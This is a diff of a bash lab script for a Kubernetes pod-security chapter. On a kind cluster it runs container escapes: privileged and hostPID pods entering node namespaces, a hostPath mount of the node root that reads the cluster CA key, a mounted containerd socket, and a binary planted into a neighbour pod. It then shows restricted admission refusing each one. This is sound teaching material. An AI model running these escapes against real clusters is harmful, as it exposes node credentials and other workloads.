@@ -1,379 +1,447 @@
 #!/usr/bin/env bash
-# Lab 05.02: Pod security and container escape. Tier A (kind).
+# Lab for 05-security/02-pod-security.md: attack, harden, re-attack.
 #
-# Run this ONLY against a kind cluster you own, from any directory. It creates
-# two throwaway namespaces (psa-lab permits everything, psa-restricted enforces
-# `restricted`), runs container-escape attacks that reach the kind NODE, then
-# shows the restricted namespace refusing every one of them at admission. It
-# then runs the Bookstore's manifests through that same check and boots its
-# data tier. It deletes everything it created at the end.
+# Tier A: kind on a Linux host. Run it only against a kind cluster you own.
+# The script refuses any kubectl context that is not kind-*, and it refuses to
+# start while one of its namespaces is left over. It creates five namespaces
+# prefixed p05-02-, and deletes them at the end. It applies the Bookstore's
+# PriorityClasses, which are cluster-scoped: on a cluster that already has
+# them, the apply can reconfigure them to match the file, and the script
+# leaves them in place.
 #
-# Every escape stops at the kind node, which is itself a container: nothing
-# here targets the machine that runs kind, and nothing touches another
-# container. Host-kernel escapes are a tier-B topic, out of this chapter.
+# Run from the repository root:
+#   KUBECONFIG=... bash full-guide/examples/security-lab/labs/05-02.sh \
+#     > full-guide/examples/security-lab/evidence/05-02.txt
 #
-# The attack manifests are deliberately insecure and live only in psa-lab. Steps
-# 10 and 11 use the `bookstore` namespace, so they are skipped on a cluster that
-# already has one: tearing it down would take your Bookstore with it.
-set +e
+# Each command is printed the way a reader types it, then run, so the output
+# under it is what that command printed. The cluster name is shown as `lab`.
 
-# busybox:1.36, pinned by digest (the image 01.01 uses).
-BB=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662
+set -uo pipefail
 
-# Read a command from stdin, print it exactly as it runs, then run it.
-run() { local cmd; cmd=$(cat); printf '$ %s\n' "$cmd"; eval "$cmd" 2>&1; echo; }
+GUIDE=$(cd "$(dirname "$0")/../../.." && pwd)
+WORK=$(mktemp -d)
+trap 'rm -rf "$WORK"' EXIT
 
-ctx=$(kubectl config current-context 2>/dev/null)
-case "$ctx" in
+CONTEXT=$(kubectl config current-context 2>/dev/null)
+case "$CONTEXT" in
   kind-*) ;;
-  *) echo "refusing to run: kubectl context '$ctx' is not a kind cluster" >&2; exit 2 ;;
+  *) echo "refusing: kubectl context '$CONTEXT' is not a kind cluster" >&2; exit 2 ;;
 esac
+CLUSTER=${CONTEXT#kind-}
 
-guide=$(cd "$(dirname "$0")/../../.." && pwd) || exit 1   # full-guide/
-work=$(mktemp -d) && cd "$work" || exit 1
+NAMESPACES="p05-02-attack p05-02-baseline p05-02-restricted p05-02-bookstore p05-02-unlabelled"
+for ns in $NAMESPACES; do
+  if kubectl get namespace "$ns" >/dev/null 2>&1; then
+    echo "refusing: namespace $ns exists; delete the old lab first" >&2
+    exit 2
+  fi
+done
 
-bookstore_free=yes
-if kubectl get ns bookstore >/dev/null 2>&1 ||
-   kubectl get priorityclass bookstore-data >/dev/null 2>&1; then
-  bookstore_free=no
-fi
+redact() { sed -e "s/${CLUSTER}/lab/g"; }
 
-kubectl delete ns psa-lab psa-restricted --ignore-not-found --wait=true >/dev/null 2>&1
+show() {
+  printf '$ %s\n' "$(printf '%s\n' "$1" | redact)"
+  eval "$1" 2>&1 | redact
+}
 
-echo '## step 1: one namespace that permits everything, one that enforces restricted'
-run <<'CMD'
-kubectl create ns psa-lab
-kubectl label ns psa-lab pod-security.kubernetes.io/enforce=privileged
+# copy_cmd DST prints the command that copies busybox from escape-node into
+# the root of the Pod that runs `sleep 1800`. The copy must find exactly one
+# such process, so the lab stops if two Pods run it at once.
+copy_cmd() {
+cat <<'CMD' | sed -e "s|@DST@|$1|g"
+kubectl exec -n p05-02-attack escape-node -- sh -c '
+VPID=$(ps -o pid,args | awk "\$2==\"sleep\" && \$3==\"1800\" {print \$1}")
+set -- $VPID
+[ $# = 1 ] || { echo "victim not unique: $VPID"; exit 1; }
+echo "victim pid $VPID"
+cp /bin/busybox /proc/$VPID/root@DST@ && echo "copied to @DST@"'
 CMD
-run <<'CMD'
-kubectl create ns psa-restricted
-kubectl label ns psa-restricted \
-  pod-security.kubernetes.io/enforce=restricted \
-  pod-security.kubernetes.io/audit=restricted \
-  pod-security.kubernetes.io/warn=restricted
-CMD
-# A Pod that names no ServiceAccount is refused until the controller has made
-# the namespace's `default` one, so a scripted apply has to wait for it.
-until kubectl get sa default -n psa-lab >/dev/null 2>&1; do sleep 1; done
+}
 
-echo '## step 2: privileged, compared with a plain Pod'
-cat >esc-privileged.yaml <<YAML
+# hostpath_read POD prints the reads a reader makes through a hostPath mount
+# of the node root. It prints the first ten bytes of the CA key only.
+hostpath_read() {
+cat <<'CMD' | sed -e "s/@POD@/$1/g"
+kubectl exec -n p05-02-attack @POD@ -- sh -c '
+id -u
+grep ^CapEff /proc/self/status | tr -s "\t" " "
+cat /host/etc/hostname
+stat -c "%a %U %n" /host/etc/kubernetes/pki/ca.key
+head -c 10 /host/etc/kubernetes/pki/ca.key; echo'
+CMD
+}
+
+cmd_hostpid_read() {
+cat <<'CMD'
+kubectl exec -n p05-02-attack escape-hostpid -- sh -c '
+K=$(pidof kubelet)
+kill -0 "$K" && echo "kill -0 kubelet: allowed"
+tr "\0" " " < "/proc/$K/cmdline" | cut -c1-40'
+CMD
+}
+
+cmd_socket() {
+cat <<'CMD'
+kubectl exec -n p05-02-attack escape-socket -- sh -c '
+R=unix:///run/containerd/containerd.sock
+echo "containers visible: $(crictl -r $R ps -q 2>/dev/null | wc -l)"
+crictl -r $R ps --name kube-apiserver -o table 2>/dev/null |
+  grep -o "kube-apiserver-[a-z0-9-]*"'
+CMD
+}
+
+cmd_bookstore_loop() {
+cat <<'CMD'
+for f in $(grep -lE '^kind: (Pod|Deployment|StatefulSet|DaemonSet|Job|CronJob)( |$)' examples/bookstore/raw-manifests/*.yaml); do
+  sed 's/namespace: bookstore/namespace: p05-02-bookstore/' "$f" |
+    kubectl apply -n p05-02-bookstore --dry-run=server -f -
+done
+CMD
+}
+
+NODE_VERSION=$(kubectl get nodes -o jsonpath='{.items[0].status.nodeInfo.kubeletVersion}' 2>/dev/null)
+printf '%s\n' \
+  "# Transcript for 05-security/02-pod-security.md." \
+  "# Tier A: kind on a Linux host, node $NODE_VERSION." \
+  "# Recorded by running labs/05-02.sh against a kind cluster the lab owns." \
+  "# The cluster name is shown as \`lab\`."
+
+cd "$WORK" || exit 2
+
+echo "## versions and the node"
+show "kubectl version"
+show "kubectl get nodes -o custom-columns=NAME:.metadata.name,KUBELET:.status.nodeInfo.kubeletVersion,KERNEL:.status.nodeInfo.kernelVersion,RUNTIME:.status.nodeInfo.containerRuntimeVersion,OS:.status.nodeInfo.osImage"
+
+echo "## namespaces"
+show "kubectl create namespace p05-02-attack"
+show "kubectl label namespace p05-02-attack pod-security.kubernetes.io/enforce=privileged"
+show "kubectl create namespace p05-02-baseline"
+show "kubectl label namespace p05-02-baseline pod-security.kubernetes.io/enforce=baseline pod-security.kubernetes.io/enforce-version=latest pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/warn-version=latest"
+show "kubectl create namespace p05-02-restricted"
+show "kubectl label namespace p05-02-restricted pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=latest pod-security.kubernetes.io/audit=restricted pod-security.kubernetes.io/audit-version=latest pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/warn-version=latest"
+show "kubectl create namespace p05-02-bookstore"
+show "kubectl label namespace p05-02-bookstore pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=latest pod-security.kubernetes.io/audit=restricted pod-security.kubernetes.io/audit-version=latest pod-security.kubernetes.io/warn=restricted pod-security.kubernetes.io/warn-version=latest"
+show "kubectl create namespace p05-02-unlabelled"
+show "for ns in p05-02-attack p05-02-baseline p05-02-restricted p05-02-bookstore p05-02-unlabelled; do for i in \$(seq 60); do kubectl -n \$ns get serviceaccount default >/dev/null 2>&1 && break; sleep 1; done; echo \"default serviceaccount in \$ns\"; done"
+
+echo "## audit: the API server's command line"
+show "kubectl -n kube-system get pod -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' | tr ',' '\n' | grep -c audit"
+
+echo "## a default Pod, and privileged without a host namespace"
+cat > victim.yaml <<'YAML'
+# INSECURE ON PURPOSE: a default Pod, root with a writable root filesystem and no securityContext. Lab cluster only.
 apiVersion: v1
 kind: Pod
-metadata: {name: escape-privileged, namespace: psa-lab}
+metadata:
+  name: victim
+  namespace: p05-02-attack
+spec:
+  containers:
+    - name: app
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
+      command: ["sleep", "1800"]
+YAML
+show "kubectl apply -f victim.yaml"
+show "kubectl wait --for=condition=Ready pod/victim -n p05-02-attack --timeout=120s"
+cat > escape-privileged.yaml <<'YAML'
+# INSECURE ON PURPOSE: a privileged container with no host namespace. Lab cluster only.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-privileged
+  namespace: p05-02-attack
 spec:
   containers:
     - name: esc
-      image: $BB
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
       command: ["sleep", "3600"]
       securityContext:
         privileged: true
 YAML
-cat >plain.yaml <<YAML
-apiVersion: v1
-kind: Pod
-metadata: {name: plain, namespace: psa-lab}
-spec:
-  containers:
-    - name: app
-      image: $BB
-      command: ["sleep", "3600"]
-YAML
-run <<'CMD'
-kubectl apply -f esc-privileged.yaml -f plain.yaml
-kubectl wait -n psa-lab --for=condition=Ready --timeout=90s pod/escape-privileged pod/plain
-CMD
-run <<'CMD'
-kubectl exec -n psa-lab escape-privileged -- sh -c '
-  grep -E "^Cap(Eff|Bnd)" /proc/self/status | tr -s "\t" " "
-  cat /proc/sys/kernel/cap_last_cap'
-CMD
-run <<'CMD'
-for p in escape-privileged plain; do
-  echo "== $p =="
-  kubectl exec -n psa-lab "$p" -- sh -c '
-    echo "entries in /dev: $(ls /dev | wc -l)"
-    mount -t tmpfs tmpfs /tmp && echo "mount: allowed" || true'
-done
-CMD
+show "kubectl apply -f escape-privileged.yaml"
+show "kubectl wait --for=condition=Ready pod/escape-privileged -n p05-02-attack --timeout=120s"
+show "kubectl exec -n p05-02-attack escape-privileged -- awk '/^Cap(Eff|Bnd)/ {print \$1, \$2}' /proc/self/status"
+show "kubectl exec -n p05-02-attack escape-privileged -- sh -c 'ps -o pid,args | head -5'"
+show "kubectl exec -n p05-02-attack escape-privileged -- sh -c 'echo devices in privileged: \$(ls /dev | wc -l)'"
+show "kubectl exec -n p05-02-attack victim -- sh -c 'echo devices in default: \$(ls /dev | wc -l)'"
 
-echo '## step 3: hostPath /, read the cluster CA key, and what root has to do with it'
-cat >esc-hostpath.yaml <<YAML
+echo "## hostPID without privilege"
+cat > escape-hostpid.yaml <<'YAML'
+# INSECURE ON PURPOSE: hostPID shares the node's process table with the Pod. Lab cluster only.
 apiVersion: v1
 kind: Pod
-metadata: {name: escape-hostpath, namespace: psa-lab}
-spec:
-  containers:
-    - name: esc
-      image: $BB
-      command: ["sleep", "3600"]
-      volumeMounts:
-        - {name: nodefs, mountPath: /host, readOnly: true}
-  volumes:
-    - name: nodefs
-      hostPath: {path: /, type: Directory}
-YAML
-cat >esc-hostpath-nocaps.yaml <<YAML
-apiVersion: v1
-kind: Pod
-metadata: {name: escape-hostpath-nocaps, namespace: psa-lab}
-spec:
-  containers:
-    - name: esc
-      image: $BB
-      command: ["sleep", "3600"]
-      securityContext:
-        capabilities: {drop: ["ALL"]}
-      volumeMounts:
-        - {name: nodefs, mountPath: /host, readOnly: true}
-  volumes:
-    - name: nodefs
-      hostPath: {path: /, type: Directory}
-YAML
-cat >esc-hostpath-nonroot.yaml <<YAML
-apiVersion: v1
-kind: Pod
-metadata: {name: escape-hostpath-nonroot, namespace: psa-lab}
-spec:
-  securityContext:
-    runAsUser: 65532
-  containers:
-    - name: esc
-      image: $BB
-      command: ["sleep", "3600"]
-      securityContext:
-        capabilities: {drop: ["ALL"]}
-      volumeMounts:
-        - {name: nodefs, mountPath: /host, readOnly: true}
-  volumes:
-    - name: nodefs
-      hostPath: {path: /, type: Directory}
-YAML
-run <<'CMD'
-kubectl apply -f esc-hostpath.yaml -f esc-hostpath-nocaps.yaml -f esc-hostpath-nonroot.yaml
-kubectl wait -n psa-lab --for=condition=Ready --timeout=90s \
-  pod/escape-hostpath pod/escape-hostpath-nocaps pod/escape-hostpath-nonroot
-CMD
-# The key itself stays out of the transcript: only the first ten bytes print,
-# which are the PEM armour and hold no key material.
-run <<'CMD'
-kubectl exec -n psa-lab escape-hostpath -- sh -c '
-  cat /host/etc/hostname
-  stat -c "%a %U %n" /host/etc/kubernetes/pki/ca.key
-  head -c 10 /host/etc/kubernetes/pki/ca.key; echo'
-CMD
-run <<'CMD'
-for p in escape-hostpath-nocaps escape-hostpath-nonroot; do
-  echo "== $p =="
-  kubectl exec -n psa-lab "$p" -- sh -c '
-    id -u
-    grep ^CapEff /proc/self/status | tr -s "\t" " "
-    cat /host/etc/hostname
-    head -c 10 /host/etc/kubernetes/pki/ca.key; echo'
-done
-CMD
-
-echo '## step 4: hostPID, see and signal every process on the node'
-cat >esc-hostpid.yaml <<YAML
-apiVersion: v1
-kind: Pod
-metadata: {name: escape-hostpid, namespace: psa-lab}
+metadata:
+  name: escape-hostpid
+  namespace: p05-02-attack
 spec:
   hostPID: true
   containers:
     - name: esc
-      image: $BB
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
       command: ["sleep", "3600"]
 YAML
-run <<'CMD'
-kubectl apply -f esc-hostpid.yaml
-kubectl wait -n psa-lab --for=condition=Ready --timeout=90s pod/escape-hostpid
-CMD
-run <<'CMD'
-kubectl exec -n psa-lab escape-hostpid -- sh -c '
-  ps -o pid,comm | grep -E "kubelet|containerd$" | sed "s/^ *//"
-  K=$(pidof kubelet)
-  kill -0 "$K" && echo "kill -0 kubelet: allowed"
-  tr "\0" " " < "/proc/$K/cmdline" | cut -c1-40'
-CMD
+show "kubectl apply -f escape-hostpid.yaml"
+show "kubectl wait --for=condition=Ready pod/escape-hostpid -n p05-02-attack --timeout=120s"
+show "kubectl exec -n p05-02-attack escape-hostpid -- sh -c 'ps -o pid,comm' | grep -E '^ *[0-9]+ (kubelet|containerd)$' | sed 's/^ *//'"
+show "$(cmd_hostpid_read)"
+show "kubectl exec -n p05-02-attack escape-hostpid -- nsenter -t 1 -m -- cat /etc/hostname"
 
-echo '## step 5: a mounted runtime socket reaches every container on the node'
-cat >esc-socket.yaml <<YAML
+echo "## hostPath: the node root, and a read of the CA key"
+cat > escape-hostpath.yaml <<'YAML'
+# INSECURE ON PURPOSE: a hostPath mount of the node root, read as root with no capabilities. Lab cluster only.
 apiVersion: v1
 kind: Pod
-metadata: {name: escape-socket, namespace: psa-lab}
+metadata:
+  name: escape-hostpath
+  namespace: p05-02-attack
 spec:
   containers:
     - name: esc
-      image: $BB
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
       command: ["sleep", "3600"]
+      securityContext:
+        capabilities:
+          drop: ["ALL"]
       volumeMounts:
-        - {name: sock, mountPath: /run/containerd/containerd.sock}
-        - {name: crictl, mountPath: /usr/local/bin/crictl, readOnly: true}
+        - name: nodefs
+          mountPath: /host
+          readOnly: true
   volumes:
-    - name: sock
-      hostPath: {path: /run/containerd/containerd.sock, type: Socket}
-    - name: crictl
-      hostPath: {path: /usr/local/bin/crictl, type: File}
+    - name: nodefs
+      hostPath:
+        path: /
+        type: Directory
 YAML
-run <<'CMD'
-kubectl apply -f esc-socket.yaml
-kubectl wait -n psa-lab --for=condition=Ready --timeout=90s pod/escape-socket
-CMD
-run <<'CMD'
-kubectl exec -n psa-lab escape-socket -- sh -c '
-  R=unix:///run/containerd/containerd.sock
-  echo "containers visible: $(crictl -r $R ps -q 2>/dev/null | wc -l)"
-  crictl -r $R ps --name kube-apiserver -o table 2>/dev/null |
-    grep -o "kube-apiserver-[a-z0-9-]*"'
-CMD
-
-echo '## step 6: no read-only root filesystem, drop a binary into the running container'
-run <<'CMD'
-kubectl exec -n psa-lab plain -- sh -c '
-  printf "%s\n" "#!/bin/sh" "echo INJECTED" > /usr/bin/backdoor
-  chmod +x /usr/bin/backdoor
-  /usr/bin/backdoor'
-CMD
-
-echo '## step 7: user namespaces, and what happened on this host'
-run <<'CMD'
-kubectl exec -n psa-lab plain -- cat /proc/self/uid_map | awk '{$1=$1;print}'
-CMD
-cat >userns-on.yaml <<YAML
+show "kubectl apply -f escape-hostpath.yaml"
+show "kubectl wait --for=condition=Ready pod/escape-hostpath -n p05-02-attack --timeout=120s"
+show "$(hostpath_read escape-hostpath)"
+cat > escape-hostpath-nonroot.yaml <<'YAML'
+# INSECURE ON PURPOSE: the same hostPath mount, run as UID 65532 with no capabilities. Lab cluster only.
 apiVersion: v1
 kind: Pod
-metadata: {name: userns-on, namespace: psa-lab}
+metadata:
+  name: escape-hostpath-nonroot
+  namespace: p05-02-attack
 spec:
-  hostUsers: false
+  securityContext:
+    runAsUser: 65532
+    runAsGroup: 65532
   containers:
-    - name: app
-      image: $BB
+    - name: esc
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
       command: ["sleep", "3600"]
+      securityContext:
+        capabilities:
+          drop: ["ALL"]
+      volumeMounts:
+        - name: nodefs
+          mountPath: /host
+          readOnly: true
+  volumes:
+    - name: nodefs
+      hostPath:
+        path: /
+        type: Directory
 YAML
-run <<'CMD'
-kubectl apply -f userns-on.yaml
-kubectl wait -n psa-lab --for=condition=Ready --timeout=30s pod/userns-on
-CMD
-run <<'CMD'
-kubectl get pod -n psa-lab userns-on
-CMD
-run <<'CMD'
-kubectl get node -o jsonpath='{.items[0].status.nodeInfo.kernelVersion}{"\n"}'
-CMD
-run <<'CMD'
-kubectl get events -n psa-lab --field-selector reason=FailedCreatePodSandBox \
-  -o jsonpath='{range .items[*]}{.message}{"\n"}{end}' |
-  sed 's/sandbox "[0-9a-f]*"/sandbox/' | tail -1
-CMD
+show "kubectl apply -f escape-hostpath-nonroot.yaml"
+show "kubectl wait --for=condition=Ready pod/escape-hostpath-nonroot -n p05-02-attack --timeout=120s"
+show "$(hostpath_read escape-hostpath-nonroot)"
 
-echo '## step 8: re-attack a restricted namespace, admission refuses every one'
-run <<'CMD'
-for a in privileged hostpath hostpid socket; do
-  echo "== $a =="
-  sed "s/psa-lab/psa-restricted/" "esc-$a.yaml" |
-    kubectl apply --dry-run=server -f - 2>&1 | sed -n 1p
+echo "## runtime socket"
+cat > escape-socket.yaml <<'YAML'
+# INSECURE ON PURPOSE: the containerd socket and crictl mounted into the Pod. Lab cluster only.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-socket
+  namespace: p05-02-attack
+spec:
+  containers:
+    - name: esc
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
+      command: ["sleep", "3600"]
+      volumeMounts:
+        - name: containerd
+          mountPath: /run/containerd/containerd.sock
+        - name: crictl
+          mountPath: /usr/local/bin/crictl
+          readOnly: true
+  volumes:
+    - name: containerd
+      hostPath:
+        path: /run/containerd/containerd.sock
+        type: Socket
+    - name: crictl
+      hostPath:
+        path: /usr/local/bin/crictl
+        type: File
+YAML
+show "kubectl apply -f escape-socket.yaml"
+show "kubectl wait --for=condition=Ready pod/escape-socket -n p05-02-attack --timeout=120s"
+show "$(cmd_socket)"
+
+echo "## privileged with hostPID: the node's namespaces, and a write into a neighbour"
+cat > escape-node.yaml <<'YAML'
+# INSECURE ON PURPOSE: privileged with hostPID, so nsenter can enter the node's namespaces. Lab cluster only.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-node
+  namespace: p05-02-attack
+spec:
+  hostPID: true
+  containers:
+    - name: esc
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
+      command: ["sleep", "3600"]
+      securityContext:
+        privileged: true
+YAML
+show "kubectl apply -f escape-node.yaml"
+show "kubectl wait --for=condition=Ready pod/escape-node -n p05-02-attack --timeout=120s"
+show "kubectl exec -n p05-02-attack escape-node -- nsenter -t 1 -m -- cat /etc/hostname"
+show "kubectl exec -n p05-02-attack escape-node -- nsenter -t 1 -m -- ls -l /etc/kubernetes/super-admin.conf"
+show "kubectl exec -n p05-02-attack escape-node -- nsenter -t 1 -m -- runc --version | head -1"
+show "$(copy_cmd /tmp/busybox)"
+show "kubectl exec -n p05-02-attack victim -- /tmp/busybox id"
+
+echo "## the same attacks under restricted"
+for f in escape-privileged escape-hostpid escape-hostpath escape-socket escape-node; do
+  show "sed 's/namespace: p05-02-attack/namespace: p05-02-restricted/' $f.yaml | kubectl apply --dry-run=server -f -"
 done
-CMD
 
-echo '## step 9: the hardened form carries the baseline and is admitted'
-cat >hardened.yaml <<YAML
+echo "## the hardened victim in restricted, and the same neighbour"
+show "kubectl delete pod victim -n p05-02-attack --wait=true"
+cat > victim-hardened.yaml <<'YAML'
 apiVersion: v1
 kind: ServiceAccount
-metadata: {name: hardened-sa, namespace: psa-restricted}
+metadata:
+  name: victim-sa
+  namespace: p05-02-restricted
 automountServiceAccountToken: false
 ---
 apiVersion: v1
 kind: Pod
-metadata: {name: hardened, namespace: psa-restricted}
+metadata:
+  name: victim
+  namespace: p05-02-restricted
 spec:
-  serviceAccountName: hardened-sa
+  serviceAccountName: victim-sa
   automountServiceAccountToken: false
   securityContext:
     runAsNonRoot: true
     runAsUser: 65532
     runAsGroup: 65532
-    seccompProfile: {type: RuntimeDefault}
+    seccompProfile:
+      type: RuntimeDefault
   containers:
     - name: app
-      image: $BB
-      command: ["sleep", "3600"]
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
+      command: ["sleep", "1800"]
       securityContext:
         allowPrivilegeEscalation: false
         readOnlyRootFilesystem: true
-        capabilities: {drop: ["ALL"]}
+        capabilities:
+          drop: ["ALL"]
       resources:
-        requests: {cpu: 10m, memory: 16Mi}
-        limits: {memory: 32Mi}
+        requests:
+          cpu: 10m
+          memory: 16Mi
+        limits:
+          memory: 32Mi
       volumeMounts:
-        - {name: tmp, mountPath: /tmp}
+        - name: tmp
+          mountPath: /tmp
   volumes:
-    - {name: tmp, emptyDir: {}}
+    - name: tmp
+      emptyDir: {}
 YAML
-run <<'CMD'
-kubectl apply -f hardened.yaml
-kubectl wait -n psa-restricted --for=condition=Ready --timeout=90s pod/hardened
-CMD
-run <<'CMD'
-kubectl exec -n psa-restricted hardened -- sh -c '
-  exec 2>&1
-  id
-  grep -E "^(CapEff|NoNewPrivs|Seccomp):" /proc/self/status | tr -s "\t" " "
-  printf x > /usr/bin/backdoor || true'
-CMD
+show "kubectl apply -f victim-hardened.yaml"
+show "kubectl wait --for=condition=Ready pod/victim -n p05-02-restricted --timeout=120s"
+show "kubectl exec -n p05-02-restricted victim -- sh -c 'cp /bin/busybox /usr/bin/implant'"
+show "kubectl exec -n p05-02-restricted victim -- sh -c 'cp /bin/busybox /tmp/busybox && /tmp/busybox id'"
+show "kubectl exec -n p05-02-restricted victim -- awk '/^(CapEff|NoNewPrivs|Seccomp):/ {print \$1, \$2}' /proc/self/status"
+show "$(copy_cmd /usr/bin/implant)"
+show "$(copy_cmd /tmp/id)"
+show "kubectl exec -n p05-02-restricted victim -- /tmp/id"
 
-if [ "$bookstore_free" = yes ]; then
-  cd "$guide" || exit 1
+echo "## user namespaces"
+show "kubectl exec -n p05-02-restricted victim -- cat /proc/self/uid_map | awk '{\$1=\$1;print}'"
+cat > userns-probe.yaml <<'YAML'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: userns-probe
+  namespace: p05-02-restricted
+spec:
+  hostUsers: false
+  serviceAccountName: victim-sa
+  automountServiceAccountToken: false
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 65532
+    runAsGroup: 65532
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: app
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
+      command: ["sleep", "1800"]
+      securityContext:
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: ["ALL"]
+      resources:
+        requests:
+          cpu: 10m
+          memory: 16Mi
+        limits:
+          memory: 32Mi
+      volumeMounts:
+        - name: tmp
+          mountPath: /tmp
+  volumes:
+    - name: tmp
+      emptyDir: {}
+YAML
+show "kubectl apply -f userns-probe.yaml"
+show "kubectl wait --for=condition=Ready pod/userns-probe -n p05-02-restricted --timeout=60s"
+show "kubectl get events -n p05-02-restricted --field-selector involvedObject.name=userns-probe --sort-by=.lastTimestamp | tail -2"
 
-  echo '## step 10: every Bookstore workload manifest, server dry-run against restricted'
-  run <<'CMD'
-kubectl apply -f examples/bookstore/raw-manifests/00-namespace.yaml
-kubectl apply -f examples/bookstore/raw-manifests/05-serviceaccounts-rbac.yaml
-CMD
-  run <<'CMD'
-for f in $(grep -lE '^  namespace: bookstore' examples/bookstore/raw-manifests/*.yaml); do
-  grep -qE '^kind: (Pod|Deployment|StatefulSet|DaemonSet|Job|CronJob)( |$)' "$f" &&
-    kubectl apply --dry-run=server -f "$f"
+echo "## baseline and restricted, one namespace each"
+cat > victim-baseline.yaml <<'YAML'
+# INSECURE ON PURPOSE: a default Pod in a baseline namespace, which restricted only warns about. Lab cluster only.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: victim
+  namespace: p05-02-baseline
+spec:
+  containers:
+    - name: app
+      image: busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662  # busybox:1.36
+      command: ["sleep", "3600"]
+YAML
+show "kubectl apply -f victim-baseline.yaml"
+show "kubectl wait --for=condition=Ready pod/victim -n p05-02-baseline --timeout=120s"
+show "sed 's/namespace: p05-02-attack/namespace: p05-02-baseline/' escape-hostpid.yaml | kubectl apply --dry-run=server -f -"
+show "sed 's/namespace: p05-02-attack/namespace: p05-02-baseline/' escape-hostpath.yaml | kubectl apply --dry-run=server -f -"
+
+echo "## the Bookstore under restricted"
+show "kubectl create deployment unhardened --image=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662 --dry-run=server -n p05-02-bookstore -- sleep 3600"
+show "kubectl create deployment unhardened --image=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662 --dry-run=server -n p05-02-unlabelled -- sleep 3600"
+( cd "$GUIDE" && show "sed 's/namespace: bookstore/namespace: p05-02-bookstore/' examples/bookstore/raw-manifests/05-serviceaccounts-rbac.yaml | kubectl apply -f -" )
+( cd "$GUIDE" && show "$(cmd_bookstore_loop)" )
+for f in 16-db-credentials 35-priorityclasses 12-redis 13-rabbitmq 20-postgres-statefulset; do
+  ( cd "$GUIDE" && show "sed 's/namespace: bookstore/namespace: p05-02-bookstore/' examples/bookstore/raw-manifests/$f.yaml | kubectl apply -f -" )
 done
-CMD
-
-  echo '## step 11: the data tier boots with a read-only root filesystem'
-  run <<'CMD'
-M=examples/bookstore/raw-manifests
-kubectl apply -f $M/16-db-credentials.yaml -f $M/35-priorityclasses.yaml
-kubectl apply -f $M/12-redis.yaml -f $M/13-rabbitmq.yaml -f $M/20-postgres-statefulset.yaml
-kubectl rollout status -n bookstore deployment/redis --timeout=300s
-kubectl rollout status -n bookstore deployment/rabbitmq --timeout=300s
-kubectl rollout status -n bookstore statefulset/postgres --timeout=300s
-CMD
-  run <<'CMD'
-M=examples/bookstore/raw-manifests
-kubectl apply -f $M/21-db-migrate-job.yaml -f $M/22-cleanup-cronjob.yaml
-kubectl wait -n bookstore --for=condition=complete --timeout=110s job/db-migrate
-kubectl create job -n bookstore cleanup-lab --from=cronjob/cleanup
-kubectl wait -n bookstore --for=condition=complete --timeout=110s job/cleanup-lab
-kubectl logs -n bookstore job/db-migrate --tail=1
-kubectl logs -n bookstore job/cleanup-lab --tail=1
-CMD
-  run <<'CMD'
+show "kubectl rollout status -n p05-02-bookstore deployment/redis --timeout=180s"
+show "kubectl rollout status -n p05-02-bookstore deployment/rabbitmq --timeout=300s"
+show "kubectl rollout status -n p05-02-bookstore statefulset/postgres --timeout=180s"
 for w in deployment/redis deployment/rabbitmq statefulset/postgres; do
-  echo "== $w =="
-  kubectl exec -n bookstore "$w" -- sh -c 'id; touch /usr/bin/backdoor || true'
+  show "kubectl exec -n p05-02-bookstore $w -- sh -c 'id; touch /usr/bin/backdoor || true'"
 done
-CMD
-else
-  echo '## steps 10 and 11 skipped: this cluster already has a bookstore namespace or its PriorityClasses'
-  echo
-fi
 
-echo '## step 12: tear down what the lab created'
-run <<'CMD'
-kubectl delete ns psa-lab psa-restricted --wait=true
-CMD
-if [ "$bookstore_free" = yes ]; then
-  run <<'CMD'
-kubectl delete ns bookstore --wait=true
-kubectl delete -f examples/bookstore/raw-manifests/35-priorityclasses.yaml
-CMD
-fi
-rm -rf "$work"
+echo "## cleanup"
+show "kubectl delete namespace $NAMESPACES --wait=true --timeout=300s"
